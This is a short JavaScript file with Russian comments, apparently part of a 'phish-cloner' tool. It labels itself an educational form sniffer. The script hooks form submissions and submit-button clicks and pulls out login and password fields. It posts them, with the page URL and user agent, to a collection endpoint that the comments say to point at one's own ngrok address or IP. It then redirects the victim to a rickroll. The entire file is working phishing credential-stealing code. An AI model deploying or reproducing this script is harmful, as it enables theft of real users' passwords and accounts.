/**
 * Учебный сниффер форм.
 * Перехватывает данные и отправляет на сервер сбора.
 * В конце перенаправляет жертву на рикролл.
 */
(function() {
    const GRAB_URL = 'http://localhost:9999/grab'; // изменить на свой ngrok/IP
    const REDIRECT_TO = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';

    function getInputValue(form, nameHints) {
        for (let hint of nameHints) {
            const el = form.querySelector(`[name="${hint}"], [id="${hint}"], [autocomplete="${hint}"]`);
            if (el) return el.value;
        }
        return null;
    }

    function captureForm(form) {
        const login = getInputValue(form, ['login', 'email', 'username', 'user']);
        const password = getInputValue(form, ['password', 'pass', 'pwd']);
        if (login || password) {
            const payload = {
                url: window.location.href,
                login: login,
                password: password,
                userAgent: navigator.userAgent
            };
            // Отправляем асинхронно, не блокируя
            fetch(GRAB_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).catch(e => console.log('[phish-cloner] Ошибка отправки:', e));
        }
    }

    document.addEventListener('submit', function(e) {
        const form = e.target;
        captureForm(form);
        // Даём форме отправиться, но затем перенаправляем
        setTimeout(() => {
            window.location.href = REDIRECT_TO;
        }, 500);
    });

    // Также можно перехватывать клик по кнопке (если submit не срабатывает)
    document.addEventListener('click', function(e) {
        const btn = e.target.closest('button[type="submit"], input[type="submit"]');
        if (btn && btn.form) {
            captureForm(btn.form);
        }
    });

    console.log('[phish-cloner] Сниффер активирован');
})();